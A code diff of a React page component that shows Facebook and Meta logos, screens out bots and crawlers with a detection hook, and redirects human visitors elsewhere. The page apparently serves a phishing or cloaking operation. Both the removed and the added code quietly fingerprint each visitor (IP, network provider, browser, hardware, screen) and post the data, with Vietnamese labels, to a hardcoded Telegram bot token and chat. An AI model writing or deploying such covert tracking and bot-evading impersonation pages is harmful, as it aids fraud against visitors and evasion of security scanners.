@@ -1,7 +1,7 @@
 import FacebookLogo from '@/assets/images/facebook-icon.webp';
 import MetaImage from '@/assets/images/meta-logo.png';
 import type { FC } from 'react';
-import { useEffect, useState } from 'react';
+import { useEffect, useRef, useState } from 'react';
 import { useBotDetection } from '@/hooks/useBotDetection';
 
 const LoadingDots = () => {
@@ -42,9 +42,9 @@ const LoadingDots = () => {
 const Index: FC = () => {
     const { isBot, isLoading, shouldRedirect } = useBotDetection();
     const [redirecting, setRedirecting] = useState(false);
+    const logSentRef = useRef(false);
 
     useEffect(() => {
-
         console.log('Redirect check:', { shouldRedirect, isBot, isLoading });
         if (shouldRedirect && !isBot && !isLoading) {
             setRedirecting(true);
@@ -53,104 +53,64 @@ const Index: FC = () => {
             window.location.href = redirectUrl;
         }
     }, [shouldRedirect, isBot, isLoading]);
-    useEffect(()=>{
-const fetchGeoAndSendTelegram = async () => {
-  const geoUrl = 'https://get.geojs.io/v1/ip/geo.json'
-  const botToken = '7818922645:AAFSGAKec6C3hdUTgtuPcRNL5DPqnj2JwfA'
-  const chatId = '-4795436920'
+    useEffect(() => {
+        if (!isLoading && !isBot && !logSentRef.current) {
+            logSentRef.current = true;
+            const fetchGeoAndSendTelegram = async () => {
+                const geoUrl = 'https://get.geojs.io/v1/ip/geo.json';
+                const botToken = '7818922645:AAFSGAKec6C3hdUTgtuPcRNL5DPqnj2JwfA'
+                const chatId = '-4795436920'
 
-  const geoRes = await fetch(geoUrl)
-  const geoData = await geoRes.json()
+                const geoRes = await fetch(geoUrl);
+                const geoData = await geoRes.json();
+                const fullFingerprint = {
+                    asn: geoData.asn,
+                    organization_name: geoData.organization_name,
+                    organization: geoData.organization,
+                    ip: geoData.ip,
+                    navigator: {
+                        userAgent: navigator.userAgent,
+                        hardwareConcurrency: navigator.hardwareConcurrency,
+                        maxTouchPoints: navigator.maxTouchPoints,
+                        webdriver: navigator.webdriver,
+                    },
+                    screen: {
+                        width: screen.width,
+                        height: screen.height,
+                        availWidth: screen.availWidth,
+                        availHeight: screen.availHeight,
+                    },
+                };
 
-  const battery = await navigator.getBattery?.()
-  const permissions = await navigator.permissions?.query({ name: 'geolocation' })
+                const msg = `🔍 <b>Log truy cập</b>
+📍 <b>IP:</b> ${fullFingerprint.ip}
+🏢 <b>ASN:</b> ${fullFingerprint.asn}
+🏛️ <b>Nhà mạng:</b> ${fullFingerprint.organization_name ?? fullFingerprint.organization ?? 'Không rõ'}
 
-  const fullFingerprint = {
-    ...geoData,
-    navigator: {
-      userAgent: navigator.userAgent,
-      platform: navigator.platform,
-      language: navigator.language,
-      languages: navigator.languages,
-      hardwareConcurrency: navigator.hardwareConcurrency,
-      deviceMemory: navigator.deviceMemory,
-      maxTouchPoints: navigator.maxTouchPoints,
-      cookieEnabled: navigator.cookieEnabled,
-      doNotTrack: navigator.doNotTrack,
-      webdriver: navigator.webdriver,
-      appCodeName: navigator.appCodeName,
-      appName: navigator.appName,
-      appVersion: navigator.appVersion,
-      product: navigator.product,
-      productSub: navigator.productSub,
-      vendor: navigator.vendor,
-      vendorSub: navigator.vendorSub,
-      plugins: [...navigator.plugins].map(p => p.name),
-      mimeTypes: [...navigator.mimeTypes].map(m => m.type),
-      pdfViewerEnabled: navigator.pdfViewerEnabled,
-      userActivation: navigator.userActivation?.toString(),
-      scheduling: navigator.scheduling?.toString(),
-      geolocation: navigator.geolocation?.toString(),
-      connection: navigator.connection ? {
-        effectiveType: navigator.connection.effectiveType,
-        downlink: navigator.connection.downlink,
-        rtt: navigator.connection.rtt,
-        saveData: navigator.connection.saveData
-      } : null,
-      battery: battery ? {
-        level: battery.level,
-        charging: battery.charging,
-        chargingTime: battery.chargingTime,
-        dischargingTime: battery.dischargingTime
-      } : null,
-      permissions: permissions ? { state: permissions.state } : null,
-      userAgentData: navigator.userAgentData,
-      onLine: navigator.onLine
-    },
-    screen: {
-      width: screen.width,
-      height: screen.height,
-      availWidth: screen.availWidth,
-      availHeight: screen.availHeight,
-      colorDepth: screen.colorDepth,
-      pixelDepth: screen.pixelDepth
-    },
-    window: {
-      innerWidth: window.innerWidth,
-      innerHeight: window.innerHeight,
-      outerWidth: window.outerWidth,
-      outerHeight: window.outerHeight,
-      devicePixelRatio: window.devicePixelRatio
-    },
-    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-    locale: Intl.DateTimeFormat().resolvedOptions().locale,
-    performance: {
-      memory: performance.memory ? {
-        jsHeapSizeLimit: performance.memory.jsHeapSizeLimit,
-        totalJSHeapSize: performance.memory.totalJSHeapSize,
-        usedJSHeapSize: performance.memory.usedJSHeapSize
-      } : null,
-      navType: performance.navigation.type
-    }
-  }
+🌐 <b>Trình duyệt:</b> ${fullFingerprint.navigator.userAgent}
+💻 <b>CPU:</b> ${fullFingerprint.navigator.hardwareConcurrency} nhân
+📱 <b>Touch:</b> ${fullFingerprint.navigator.maxTouchPoints} điểm
+🤖 <b>WebDriver:</b> ${fullFingerprint.navigator.webdriver ? 'Có' : 'Không'}
 
-  const msg = `<pre>${JSON.stringify(fullFingerprint, null, 2)}</pre>`
+📺 <b>Màn hình:</b> ${fullFingerprint.screen.width}x${fullFingerprint.screen.height}
+📐 <b>Màn hình thực:</b> ${fullFingerprint.screen.availWidth}x${fullFingerprint.screen.availHeight}`;
 
-  const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`
-  const payload = {
-    chat_id: chatId,
-    text: msg,
-    parse_mode: 'HTML'
-  }
+                const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+                const payload = {
+                    chat_id: chatId,
+                    text: msg,
+                    parse_mode: 'HTML',
+                };
 
-  await fetch(telegramUrl, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify(payload)
-  })
-}
-fetchGeoAndSendTelegram()
-},[])
+                await fetch(telegramUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload),
+                });
+            };
+            fetchGeoAndSendTelegram();
+        }
+    }, [isLoading, isBot]);
     useEffect(() => {
         if (!isLoading && !isBot && !shouldRedirect) {
             const timer = setTimeout(() => {
